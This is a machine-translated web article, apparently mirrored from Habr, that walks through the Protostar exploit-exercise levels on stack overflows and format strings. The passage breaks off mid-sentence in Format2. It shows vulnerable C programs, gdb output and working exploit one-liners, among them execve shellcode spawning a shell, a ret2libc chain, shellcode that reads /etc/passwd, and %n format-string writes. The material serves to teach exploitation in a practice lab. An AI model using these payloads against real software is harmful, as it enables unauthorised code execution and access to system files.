<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>Exploit Exercises: Introducing binary vulnerabilities using the example of Protostar</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Good day to all. We continue the analysis of tasks from the site Exploit Exercises , and today we will consider the main types of binary vulnerabiliti...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>Exploit Exercises: Introducing binary vulnerabilities using the example of Protostar</h1><div class="post__text post__text-html js-mediator-article"><img src="https://habrastorage.org/files/764/980/de3/764980de39794db0943c7951413dcffd.png"><br><br>  Good day to all.  We continue the analysis of tasks from the site <a href="https://exploit-exercises.com/">Exploit Exercises</a> , and today we will consider the main types of binary vulnerabilities.  The tasks themselves are available <a href="https://exploit-exercises.com/protostar/">here</a> .  This time 24 levels are available to us, in the following areas: <br><br><ul><li>  Network programming </li><li>  Byte order </li><li>  Handling sockets </li><li>  Stack overflows </li><li>  Format strings </li><li>  Heap overflows </li></ul><a name="habracut"></a><br>  Assignments in each category go from simple to complex, demonstrating basic techniques for exploiting vulnerabilities. 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
    <h3>  Stack0 </h3><br>  This level demonstrates how changing local variables during a normal buffer overflow can affect program flow. <br><br><div class="spoiler">  <b class="spoiler_title">stack0.c</b> <div class="spoiler_text"><pre><code class="cpp hljs"><span class="hljs-meta"><span class="hljs-meta">#</span><span class="hljs-meta-keyword"><span class="hljs-meta"><span class="hljs-meta-keyword">include</span></span></span><span class="hljs-meta"> </span><span class="hljs-meta-string"><span class="hljs-meta"><span class="hljs-meta-string">&lt;stdlib.h&gt; #include &lt;unistd.h&gt; #include &lt;stdio.h&gt; int main(int argc, char **argv) { volatile int modified; char buffer[64]; modified = 0; gets(buffer); if(modified != 0) { printf("you have changed the 'modified' variable\n"); } else { printf("Try again?\n"); } }</span></span></span></span></code> </pre> <br></div></div><br>  All you need to do is simply to overflow to send to the variable <i>buffer</i> , a string that exceeds its size: <br><br><pre> <code class="bash hljs">user@protostar:~$ python -c <span class="hljs-string"><span class="hljs-string">'print("A"*100)'</span></span> | /opt/protostar/bin/stack0</code> </pre> <br>  We get the result: <br><blockquote>  you have changed the 'modified' variable </blockquote><br><h3>  Stack1 </h3><br>  At the last level, we simply overwritten the <i>modified</i> variable, this requires assigning a specific value to it: <br><br><div class="spoiler">  <b class="spoiler_title">stack1.c</b> <div class="spoiler_text"><pre> <code class="cpp hljs"><span class="hljs-meta"><span class="hljs-meta">#</span><span class="hljs-meta-keyword"><span class="hljs-meta"><span class="hljs-meta-keyword">include</span></span></span><span class="hljs-meta"> </span><span class="hljs-meta-string"><span class="hljs-meta"><span class="hljs-meta-string">&lt;stdlib.h&gt; #include &lt;unistd.h&gt; #include &lt;stdio.h&gt; #include &lt;string.h&gt; int main(int argc, char **argv) { volatile int modified; char buffer[64]; if(argc == 1) { errx(1, "please specify an argument\n"); } modified = 0; strcpy(buffer, argv[1]); if(modified == 0x61626364) { printf("you have correctly got the variable to the right value\n"); } else { printf("Try again, you got 0x%08x\n", modified); } }</span></span></span></span></code> </pre> <br></div></div><br>  Therefore, first fill <i>buffer</i> , and then set <i>modified</i> : <br><br><pre> <code class="bash hljs">user@protostar:~$ /opt/protostar/bin/stack1 `python -c <span class="hljs-string"><span class="hljs-string">'from struct import pack; print("A"*64+pack("&lt;I", 0x61626364))'</span></span>`</code> </pre> <br>  And the success message: <br><blockquote>  the variable </blockquote><br><h3>  Stack2 </h3><br>  At this level, everything is the same, except that the values ‚Äã‚Äãare read from the environment variables.  And you, as you remember from the <a href="https://habrahabr.ru/post/319380/">previous part</a> , cannot be trusted: <br><br><div class="spoiler">  <b class="spoiler_title">stack2.c</b> <div class="spoiler_text"><pre> <code class="cpp hljs"><span class="hljs-meta"><span class="hljs-meta">#</span><span class="hljs-meta-keyword"><span class="hljs-meta"><span class="hljs-meta-keyword">include</span></span></span><span class="hljs-meta"> </span><span class="hljs-meta-string"><span class="hljs-meta"><span class="hljs-meta-string">&lt;stdlib.h&gt; #include &lt;unistd.h&gt; #include &lt;stdio.h&gt; #include &lt;string.h&gt; int main(int argc, char **argv) { volatile int modified; char buffer[64]; char *variable; variable = getenv("GREENIE"); if(variable == NULL) { errx(1, "please set the GREENIE environment variable\n"); } modified = 0; strcpy(buffer, variable); if(modified == 0x0d0a0d0a) { printf("you have correctly modified the variable\n"); } else { printf("Try again, you got 0x%08x\n", modified); } }</span></span></span></span></code> </pre> <br></div></div><br>  Run <i>stack2</i> with the <i>GREENIE</i> environment <i>variable</i> set in <i>advance</i> : <br><pre> <code class="bash hljs">user@protostar:~$ GREENIE=`python -c <span class="hljs-string"><span class="hljs-string">'from struct import pack; print("A"*64+pack("&lt;I",0x0d0a0d0a))'</span></span>` /opt/protostar/bin/stack2</code> </pre> <br><blockquote>  the variable </blockquote><br><h3>  Stack3 </h3><br>  At this level, we are required to capture the <i>EIP</i> register and transfer control to the <i>win</i> function: <br><br><div class="spoiler">  <b class="spoiler_title">stack3.c</b> <div class="spoiler_text"><pre> <code class="cpp hljs"><span class="hljs-meta"><span class="hljs-meta">#</span><span class="hljs-meta-keyword"><span class="hljs-meta"><span class="hljs-meta-keyword">include</span></span></span><span class="hljs-meta"> </span><span class="hljs-meta-string"><span class="hljs-meta"><span class="hljs-meta-string">&lt;stdlib.h&gt; #include &lt;unistd.h&gt; #include &lt;stdio.h&gt; #include &lt;string.h&gt; void win() { printf("code flow successfully changed\n"); } int main(int argc, char **argv) { volatile int (*fp)(); char buffer[64]; fp = 0; gets(buffer); if(fp) { printf("calling function pointer, jumping to 0x%08x\n", fp); fp(); } }</span></span></span></span></code> </pre> <br></div></div><br>  First, find out its address: <br><br><pre> <code class="hljs mel">(gdb) disassemble win Dump of assembler code <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> function win: <span class="hljs-number"><span class="hljs-number">0x08048424</span></span> &lt;win+<span class="hljs-number"><span class="hljs-number">0</span></span>&gt;: push %ebp <span class="hljs-number"><span class="hljs-number">0x08048425</span></span> &lt;win+<span class="hljs-number"><span class="hljs-number">1</span></span>&gt;: mov %esp,%ebp <span class="hljs-number"><span class="hljs-number">0x08048427</span></span> &lt;win+<span class="hljs-number"><span class="hljs-number">3</span></span>&gt;: sub $0x18,%esp <span class="hljs-number"><span class="hljs-number">0x0804842a</span></span> &lt;win+<span class="hljs-number"><span class="hljs-number">6</span></span>&gt;: movl $0x8048540,(%esp) <span class="hljs-number"><span class="hljs-number">0x08048431</span></span> &lt;win+<span class="hljs-number"><span class="hljs-number">13</span></span>&gt;: call <span class="hljs-number"><span class="hljs-number">0x8048360</span></span> &lt;puts@plt&gt; <span class="hljs-number"><span class="hljs-number">0x08048436</span></span> &lt;win+<span class="hljs-number"><span class="hljs-number">18</span></span>&gt;: leave <span class="hljs-number"><span class="hljs-number">0x08048437</span></span> &lt;win+<span class="hljs-number"><span class="hljs-number">19</span></span>&gt;: ret End of assembler dump.</code> </pre> <br>  And perform the familiar actions: <br><br><pre> <code class="bash hljs">user@protostar:~$ python -c <span class="hljs-string"><span class="hljs-string">'from struct import pack; print("A"*64+pack("&lt;I", 0x08048424))'</span></span> | /opt/protostar/bin/stack3</code> </pre> <br>  The return address has been changed, the following message notifies us: <br><blockquote>  calling function pointer, jumping to 0x08048424 <br>  code flow successfully changed </blockquote><br><h3>  Stack4 </h3><br>  This level already demonstrates the change of the return address, at its usual location on the stack: <br><br><div class="spoiler">  <b class="spoiler_title">stack4.c</b> <div class="spoiler_text"><pre> <code class="cpp hljs"><span class="hljs-meta"><span class="hljs-meta">#</span><span class="hljs-meta-keyword"><span class="hljs-meta"><span class="hljs-meta-keyword">include</span></span></span><span class="hljs-meta"> </span><span class="hljs-meta-string"><span class="hljs-meta"><span class="hljs-meta-string">&lt;stdlib.h&gt; #include &lt;unistd.h&gt; #include &lt;stdio.h&gt; #include &lt;string.h&gt; void win() { printf("code flow successfully changed\n"); } int main(int argc, char **argv) { char buffer[64]; gets(buffer); }</span></span></span></span></code> </pre> <br></div></div><br><pre> <code class="bash hljs">user@protostar:~$ gdb /opt/protostar/bin/stack4</code> </pre> <br>  Find out the address where the <i>win</i> function is located: <br><br><pre> <code class="hljs mel">(gdb) disassemble win Dump of assembler code <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> function win: <span class="hljs-number"><span class="hljs-number">0x080483f4</span></span> &lt;win+<span class="hljs-number"><span class="hljs-number">0</span></span>&gt;: push %ebp <span class="hljs-number"><span class="hljs-number">0x080483f5</span></span> &lt;win+<span class="hljs-number"><span class="hljs-number">1</span></span>&gt;: mov %esp,%ebp <span class="hljs-number"><span class="hljs-number">0x080483f7</span></span> &lt;win+<span class="hljs-number"><span class="hljs-number">3</span></span>&gt;: sub $0x18,%esp <span class="hljs-number"><span class="hljs-number">0x080483fa</span></span> &lt;win+<span class="hljs-number"><span class="hljs-number">6</span></span>&gt;: movl $0x80484e0,(%esp) <span class="hljs-number"><span class="hljs-number">0x08048401</span></span> &lt;win+<span class="hljs-number"><span class="hljs-number">13</span></span>&gt;: call <span class="hljs-number"><span class="hljs-number">0x804832c</span></span> &lt;puts@plt&gt; <span class="hljs-number"><span class="hljs-number">0x08048406</span></span> &lt;win+<span class="hljs-number"><span class="hljs-number">18</span></span>&gt;: leave <span class="hljs-number"><span class="hljs-number">0x08048407</span></span> &lt;win+<span class="hljs-number"><span class="hljs-number">19</span></span>&gt;: ret End of assembler dump.</code> </pre> <br>  Next, we find an offset on the stack, to overwrite the <i>EIP</i> register: <br><br><pre> <code class="bash hljs">gdb-peda$ pattern_create 100 <span class="hljs-string"><span class="hljs-string">'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'</span></span></code> </pre> <br><img src="https://habrastorage.org/files/906/fdd/9c5/906fdd9c50f64215b282f6bd7b74dd55.png"><br><br>  Well and actually having executed the small code, we force the program to pass to a site necessary to us: <br><br><pre> <code class="bash hljs">opt/protostar/bin$ perl -e <span class="hljs-string"><span class="hljs-string">'print "A"x76 . "\xf4\x83\x04\x08"'</span></span> | ./stack4</code> </pre> <br>  What the message indicates: <br><blockquote>  code flow successfully changed </blockquote><br><h3>  Stack5 </h3><br>  At this level, an introduction to using shell codes begins. <br><br><div class="spoiler">  <b class="spoiler_title">stack5.c</b> <div class="spoiler_text"><pre> <code class="cpp hljs"><span class="hljs-meta"><span class="hljs-meta">#</span><span class="hljs-meta-keyword"><span class="hljs-meta"><span class="hljs-meta-keyword">include</span></span></span><span class="hljs-meta"> </span><span class="hljs-meta-string"><span class="hljs-meta"><span class="hljs-meta-string">&lt;stdlib.h&gt; #include &lt;unistd.h&gt; #include &lt;stdio.h&gt; #include &lt;string.h&gt; int main(int argc, char **argv) { char buffer[64]; gets(buffer); }</span></span></span></span></code> </pre> <br></div></div><br><pre> <code class="bash hljs">user@protostar:/opt/protostar/bin$ gdb -ex r ./stack5</code> </pre> <br><blockquote>  Starting program: / opt / protostar / bin / stack5 <br>  BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB <br>  BBBBBBBBBBBBBAAAA <br><br>  Program received signal SIGSEGV, Segmentation fault. <br>  0x41414141 in ??  () <br><br><pre> <code class="hljs go">(gdb) x/<span class="hljs-number"><span class="hljs-number">20</span></span>xw $esp<span class="hljs-number"><span class="hljs-number">-100</span></span> <span class="hljs-number"><span class="hljs-number">0xbffff</span></span>76c: <span class="hljs-number"><span class="hljs-number">0x080483d</span></span>9 <span class="hljs-number"><span class="hljs-number">0xbffff</span></span>780 <span class="hljs-number"><span class="hljs-number">0xb7ec6165</span></span> <span class="hljs-number"><span class="hljs-number">0xbffff</span></span>788 <span class="hljs-number"><span class="hljs-number">0xbffff</span></span>77c: <span class="hljs-number"><span class="hljs-number">0xb7ead</span></span>a75 <span class="hljs-number"><span class="hljs-number">0x42424242</span></span> <span class="hljs-number"><span class="hljs-number">0x42424242</span></span> <span class="hljs-number"><span class="hljs-number">0x42424242</span></span> <span class="hljs-number"><span class="hljs-number">0xbffff</span></span>78c: <span class="hljs-number"><span class="hljs-number">0x42424242</span></span> <span class="hljs-number"><span class="hljs-number">0x42424242</span></span> <span class="hljs-number"><span class="hljs-number">0x42424242</span></span> <span class="hljs-number"><span class="hljs-number">0x42424242</span></span> <span class="hljs-number"><span class="hljs-number">0xbffff</span></span>79c: <span class="hljs-number"><span class="hljs-number">0x42424242</span></span> <span class="hljs-number"><span class="hljs-number">0x42424242</span></span> <span class="hljs-number"><span class="hljs-number">0x42424242</span></span> <span class="hljs-number"><span class="hljs-number">0x42424242</span></span> <span class="hljs-number"><span class="hljs-number">0xbffff</span></span>7ac: <span class="hljs-number"><span class="hljs-number">0x42424242</span></span> <span class="hljs-number"><span class="hljs-number">0x42424242</span></span> <span class="hljs-number"><span class="hljs-number">0x42424242</span></span> <span class="hljs-number"><span class="hljs-number">0x42424242</span></span></code> </pre> </blockquote><br>  Create a small <i>shellcode</i> in <i>peda</i> : <br><br><pre> <code class="bash hljs">gdb-peda$ shellcode generate x86/linux <span class="hljs-built_in"><span class="hljs-built_in">exec</span></span> <span class="hljs-comment"><span class="hljs-comment"># x86/linux/exec: 24 bytes shellcode = ( "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31" "\xc9\x89\xca\x6a\x0b\x58\xcd\x80" )</span></span></code> </pre> <br>  It remains to combine all this: <br><br><pre> <code class="bash hljs">user@protostar:/opt/protostar/bin$ (python -c <span class="hljs-string"><span class="hljs-string">'from struct import pack; print("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80"+"\x90"*(76-24)+pack("&lt;I", 0xbffff780))'</span></span>;cat) | gdb -q -ex r --batch ./stack5 Executing new program: /bin/dash id uid=1001(user) gid=1001(user) groups=1001(user)</code> </pre> <br>  I‚Äôll explain a little bit: <i>cat</i> starts in normal mode and endlessly starts sending everything that comes to <i>STDIN</i> to <i>STDOUT</i> , <i>dash</i> cannot do this, and closes without parameters immediately. <br><br><h3>  Stack6 </h3><br>  We continue to study shellcode.  At this level, we are asked to use one of the techniques for successful operation: <i>ret2libc</i> or <i>ROP</i> . <br><br><div class="spoiler">  <b class="spoiler_title">stack6.c</b> <div class="spoiler_text"><pre> <code class="cpp hljs"><span class="hljs-meta"><span class="hljs-meta">#</span><span class="hljs-meta-keyword"><span class="hljs-meta"><span class="hljs-meta-keyword">include</span></span></span><span class="hljs-meta"> </span><span class="hljs-meta-string"><span class="hljs-meta"><span class="hljs-meta-string">&lt;stdlib.h&gt; #include &lt;unistd.h&gt; #include &lt;stdio.h&gt; #include &lt;string.h&gt; void getpath() { char buffer[64]; unsigned int ret; printf("input path please: "); fflush(stdout); gets(buffer); ret = __builtin_return_address(0); if((ret &amp; 0xbf000000) == 0xbf000000) { printf("bzzzt (%p)\n", ret); _exit(1); } printf("got path %s\n", buffer); } int main(int argc, char **argv) { getpath(); }</span></span></span></span></code> </pre> <br></div></div><br>  With the code everything is clear, let's start searching for the return address.  Download the file yourself and run it in <i><a href="https://github.com/longld/peda">peda</a></i> , create a pattern: <br><br><img src="https://habrastorage.org/files/d00/ec8/eae/d00ec8eaed0e464585ea716155948c6b.png"><br><br>  Run our binary, transfer the created template to it, and ask <i>peda to</i> find the offsets we need: <br><br><img src="https://habrastorage.org/files/a70/240/47c/a7024047ca4548e1bfb92166c9817180.png"><br><br>  In this task we will use the <i>ret2libc</i> technique, but first we will find the necessary addresses: <br><br><pre> <code class="bash hljs">(gdb) x/s *((char **)environ+14) 0xbfffff84: <span class="hljs-string"><span class="hljs-string">"SHELL=/bin/sh"</span></span> (gdb) p system <span class="hljs-variable"><span class="hljs-variable">$1</span></span> = {&lt;text variable, no debug info&gt;} 0xb7ecffb0 &lt;__libc_system&gt; (gdb) p <span class="hljs-built_in"><span class="hljs-built_in">exit</span></span> <span class="hljs-variable"><span class="hljs-variable">$1</span></span> = {&lt;text variable, no debug info&gt;} 0xb7ec60c0 &lt;*__GI_exit&gt;</code> </pre> <br>  Since we do not have <i>ASLR</i> enabled, there are no problems with this.  As a parameter for the <i>system</i> function, pass it the address to the environment variable <i>SHELL</i> .  Thus, we have all the necessary data to create a sploita: <br><br><pre> <code class="python hljs">eipOffset = <span class="hljs-number"><span class="hljs-number">80</span></span> systemAddr = <span class="hljs-number"><span class="hljs-number">0xb7ecffb0</span></span> exitAddr = <span class="hljs-number"><span class="hljs-number">0xb7ec60c0</span></span> shellAddr = <span class="hljs-number"><span class="hljs-number">0xbfffff8a</span></span></code> </pre> <br>  Itself will float like this: <br><blockquote>  A * eipOffset |  systemAddr |  exitAddr |  shellAddr </blockquote><br>  It remains to combine all this: <br><br><img src="https://habrastorage.org/files/4a5/0de/d73/4a50ded73a704098a6708ddea63a3cc0.png"><br><br>  After launch, we get access to the shell. <br><br>  <i>PS The answer to the question: why, despite the presence of the SUID bit, we do not get root, was <a href="https://habrahabr.ru/post/319380/">parsed in the Level11</a> task</i> <br><br><h3>  Stack7 </h3><br>  The level is the same as the previous one, except that we are asked to use <i>msfelfscan</i> to search for ROP gadgets. <br><br><div class="spoiler">  <b class="spoiler_title">stack7.c</b> <div class="spoiler_text"><pre> <code class="cpp hljs"><span class="hljs-meta"><span class="hljs-meta">#</span><span class="hljs-meta-keyword"><span class="hljs-meta"><span class="hljs-meta-keyword">include</span></span></span><span class="hljs-meta"> </span><span class="hljs-meta-string"><span class="hljs-meta"><span class="hljs-meta-string">&lt;stdlib.h&gt; #include &lt;unistd.h&gt; #include &lt;stdio.h&gt; #include &lt;string.h&gt; char *getpath() { char buffer[64]; unsigned int ret; printf("input path please: "); fflush(stdout); gets(buffer); ret = __builtin_return_address(0); if((ret &amp; 0xb0000000) == 0xb0000000) { printf("bzzzt (%p)\n", ret); _exit(1); } printf("got path %s\n", buffer); return strdup(buffer); } int main(int argc, char **argv) { getpath(); }</span></span></span></span></code> </pre> <br></div></div><br>  Perform the same actions as in the previous task: <br><br><img src="https://habrastorage.org/files/34e/286/80b/34e28680b5324c3992c5166b7240d9af.png"><br><br>  As we can see, the <i>peda</i> informed us that the <i>EAX</i> register points to the beginning of our buffer.  Let's try to find the <i>call / jmp eax</i> instructions in the <i>stack7</i> code, using the suggested <i>msfelfscan</i> : <br><br><pre> <code class="bash hljs">$ msfelfscan -j eax ./stack7 [./stack7] 0x080484bf call eax 0x080485eb call eax</code> </pre> <br>  For example, take <a href="http://shell-storm.org/shellcode/files/shellcode-571.php">this</a> shell, which will bring us the contents of the file <i>/ etc / passwd</i> <br>  As a result, the flop will look like this: <br><br><pre> <code class="bash hljs">user@protostar:/opt/protostar/bin$ python -c <span class="hljs-string"><span class="hljs-string">'from struct import pack; print("\x31\xc0\x99\x52\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3\x52\x68\x73\x73\x77\x64\x68\x2f\x2f\x70\x61\x68\x2f\x65\x74\x63\x89\xe1\xb0\x0b\x52\x51\x53\x89\xe1\xcd\x80"+"\x90"*(80-43)+pack("&lt;I",0x080484bf))'</span></span> | ./stack7</code> </pre> <br>  After starting, we get the appropriate output: <br><br><div class="spoiler">  <b class="spoiler_title">Result of work</b> <div class="spoiler_text"><blockquote>  input path please: got path 1  Rh / cath / bin  Rhsswdh // pah / etc    <br>  RQS  ÃÄ                                      <br><pre> <code class="bash hljs">root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/bin/sh bin:x:2:2:bin:/bin:/bin/sh sys:x:3:3:sys:/dev:/bin/sh sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/bin/sh man:x:6:12:man:/var/cache/man:/bin/sh lp:x:7:7:lp:/var/spool/lpd:/bin/sh mail:x:8:8:mail:/var/mail:/bin/sh news:x:9:9:news:/var/spool/news:/bin/sh uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh proxy:x:13:13:proxy:/bin:/bin/sh www-data:x:33:33:www-data:/var/www:/bin/sh backup:x:34:34:backup:/var/backups:/bin/sh list:x:38:38:Mailing List Manager:/var/list:/bin/sh irc:x:39:39:ircd:/var/run/ircd:/bin/sh gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh nobody:x:65534:65534:nobody:/nonexistent:/bin/sh libuuid:x:100:101::/var/lib/libuuid:/bin/sh Debian-exim:x:101:103::/var/spool/exim4:/bin/<span class="hljs-literal"><span class="hljs-literal">false</span></span> statd:x:102:65534::/var/lib/nfs:/bin/<span class="hljs-literal"><span class="hljs-literal">false</span></span> sshd:x:103:65534::/var/run/sshd:/usr/sbin/nologin protostar:x:1000:1000:protostar,,,:/home/protostar:/bin/bash user:x:1001:1001::/home/user:/bin/sh</code> </pre> </blockquote><br></div></div><br><h3>  Format0 </h3><br>  We came to the vulnerabilities of the format string.  This level demonstrates an example of how using this vulnerability can change the course of program execution.  In this case, there is a condition: You need to fit into a string of 10 bytes. <br><br><div class="spoiler">  <b class="spoiler_title">format0.c</b> <div class="spoiler_text"><pre> <code class="cpp hljs"><span class="hljs-meta"><span class="hljs-meta">#</span><span class="hljs-meta-keyword"><span class="hljs-meta"><span class="hljs-meta-keyword">include</span></span></span><span class="hljs-meta"> </span><span class="hljs-meta-string"><span class="hljs-meta"><span class="hljs-meta-string">&lt;stdlib.h&gt; #include &lt;unistd.h&gt; #include &lt;stdio.h&gt; #include &lt;string.h&gt; void vuln(char *string) { volatile int target; char buffer[64]; target = 0; sprintf(buffer, string); if(target == 0xdeadbeef) { printf("you have hit the target correctly :)\n"); } } int main(int argc, char **argv) { vuln(argv[1]); }</span></span></span></span></code> </pre> <br></div></div><br>  The program accepts the first command line argument, and passes it to <i>sprintf</i> without filtering.  In the case of a normal overflow, this solution would look like this: <br><br><pre> <code class="bash hljs">user@protostar://opt/protostar/bin$ ./format0 `python -c <span class="hljs-string"><span class="hljs-string">'from struct import pack; print("A"*64+pack("&lt;I",0xdeadbeef))'</span></span>` you have hit the target correctly :)</code> </pre> <br>  In 10 bytes, we obviously do not fit, so it is worth resorting to the possibilities of string formatting: <br><br><pre> <code class="bash hljs">user@protostar://opt/protostar/bin$ ./format0 `python -c <span class="hljs-string"><span class="hljs-string">'from struct import pack; print("%64x"+pack("&lt;I",0xdeadbeef))'</span></span>` you have hit the target correctly :)</code> </pre> <br>  We still solved the problem by overflowing the variable <i>buffer</i> , but now the <i>sprintf</i> function did it for us. <br><br><h3>  Format1 </h3><br>  The <i>Format1</i> level demonstrates the ability to change values ‚Äã‚Äãin memory at an arbitrary address. <br><br><div class="spoiler">  <b class="spoiler_title">format1.c</b> <div class="spoiler_text"><pre> <code class="cpp hljs"><span class="hljs-meta"><span class="hljs-meta">#</span><span class="hljs-meta-keyword"><span class="hljs-meta"><span class="hljs-meta-keyword">include</span></span></span><span class="hljs-meta"> </span><span class="hljs-meta-string"><span class="hljs-meta"><span class="hljs-meta-string">&lt;stdlib.h&gt; #include &lt;unistd.h&gt; #include &lt;stdio.h&gt; #include &lt;string.h&gt; int target; void vuln(char *string) { printf(string); if(target) { printf("you have modified the target :)\n"); } } int main(int argc, char **argv) { vuln(argv[1]); }</span></span></span></span></code> </pre> <br></div></div><br>  Using <i>objdump</i> we find the address where the <i>target</i> variable is located: <br><br><pre> <code class="bash hljs">user@protostar:/opt/protostar/bin$ objdump -t ./format1 | grep target 08049638 g O .bss 00000004 target</code> </pre> <br>  Next, we calculate the offset, where we can write data: <br><br><pre> <code class="bash hljs">user@protostar://opt/protostar/bin$ <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> i <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> {1..200}; <span class="hljs-keyword"><span class="hljs-keyword">do</span></span> ./format1 <span class="hljs-string"><span class="hljs-string">"AAAA%</span><span class="hljs-variable"><span class="hljs-string"><span class="hljs-variable">$i</span></span></span><span class="hljs-string">\$x"</span></span>; <span class="hljs-built_in"><span class="hljs-built_in">echo</span></span> <span class="hljs-string"><span class="hljs-string">" </span><span class="hljs-variable"><span class="hljs-string"><span class="hljs-variable">$i</span></span></span><span class="hljs-string">"</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">done</span></span> | grep 4141 AAAA41414141 127</code> </pre> <br>  Now we can change the value of the global <i>target</i> variable, as follows: <br><br><pre> <code class="bash hljs">user@protostar://opt/protostar/bin$ ./format1 `python -c <span class="hljs-string"><span class="hljs-string">'from struct import pack; print(pack("&lt;I",0x08049638)+"%127$n")'</span></span>` 8 you have modified the target :)</code> </pre> <br><h3>  Format2 </h3><br>  The next level demonstrates not just the change of an arbitrary address, but the recording of a specific value on it. <br><br><div class="spoiler">  <b class="spoiler_title">format2.c</b> <div class="spoiler_text"><pre> <code class="cpp hljs"><span class="hljs-meta"><span class="hljs-meta">#</span><span class="hljs-meta-keyword"><span class="hljs-meta"><span class="hljs-meta-keyword">include</span></span></span><span class="hljs-meta"> </span><span class="hljs-meta-string"><span class="hljs-meta"><span class="hljs-meta-string">&lt;stdlib.h&gt; #include &lt;unistd.h&gt; #include &lt;stdio.h&gt; #include &lt;string.h&gt; int target; void vuln() { char buffer[512]; fgets(buffer, sizeof(buffer), stdin); printf(buffer); if(target == 64) { printf("you have modified the target :)\n"); } else { printf("target is %d :(\n", target); } } int main(int argc, char **argv) { vuln(); }</span></span></span></span></code> </pre> <br></div></div><br>  Actually, the algorithm of actions at the first stage will be the same, we will just try to write some value in the <i>target</i> .  At the same time, let's see how the previous example worked. <br><br>  Find out the necessary information: <br><br><pre> <code class="bash hljs">user@protostar:/opt/protostar/bin$ objdump -t ./format2 | grep target 080496e4 g O .bss 00000004 target user@protostar:/opt/protostar/bin$ <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> i <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> {1..200}; <span class="hljs-keyword"><span class="hljs-keyword">do</span></span> <span class="hljs-built_in"><span class="hljs-built_in">echo</span></span> -n <span class="hljs-string"><span class="hljs-string">"</span><span class="hljs-variable"><span class="hljs-string"><span class="hljs-variable">$i</span></span></span><span class="hljs-string"> -&gt; "</span></span>; <span class="hljs-built_in"><span class="hljs-built_in">echo</span></span> <span class="hljs-string"><span class="hljs-string">"AAAA%</span><span class="hljs-variable"><span class="hljs-string"><span class="hljs-variable">$i</span></span></span><span class="hljs-string">\$x"</span></span> | ./format2; <span class="hljs-keyword"><span class="hljs-keyword">done</span></span> | grep 4141 4 -&gt; AAAA41414141</code> </pre> <br>  Now let's try to write as it was at the previous level: <br><br><pre> <code class="bash hljs">user@protostar:/opt/protostar/bin$ python -c <span class="hljs-string"><span class="hljs-string">'from struct import pack; print(pack("&lt;I",0x080496e4)+"%4$n")'</span></span> | ./format2    target is 4 :( user@protostar:/opt/protostar/bin$ python -c <span class="hljs-string"><span class="hljs-string">'from struct import pack; print(pack("&lt;I",0x080496e4)+"A"+"%4$n")'</span></span> | ./format2   A target is 5 :(</code> <span class="notranslate" onmouseover="_tipon(this)" onmouseout="_tipoff()"></span> <code class="bash hljs">user@protostar:/opt/protostar/bin$ python -c <span class="hljs-string"><span class="hljs-string">'from struct import pack; print(pack("&lt;I",0x080496e4)+"%4$n")'</span></span> | ./format2    target is 4 :( user@protostar:/opt/protostar/bin$ python -c <span class="hljs-string"><span class="hljs-string">'from struct import pack; print(pack("&lt;I",0x080496e4)+"A"+"%4$n")'</span></span> | ./format2   A target is 5 :(</code> </pre> <br>  As expected, the <i>target</i> contains the number of 